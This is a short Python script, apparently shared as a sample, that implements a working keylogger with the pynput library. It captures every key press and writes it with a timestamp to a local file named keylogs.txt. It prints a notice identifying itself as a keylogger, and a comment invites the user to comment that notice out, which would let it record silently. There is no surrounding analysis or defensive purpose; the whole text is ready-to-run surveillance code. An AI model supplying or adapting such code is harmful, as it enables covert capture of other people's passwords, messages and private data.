
from pynput.keyboard import Key, Listener
import logging

print("WHEN DONE CLOSE THIS WINDOW\nTHIS IS A SAMPLE OF A KEYLOGGER MADE FROM PYTHON ")
# comment out the above line if you want (:
log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

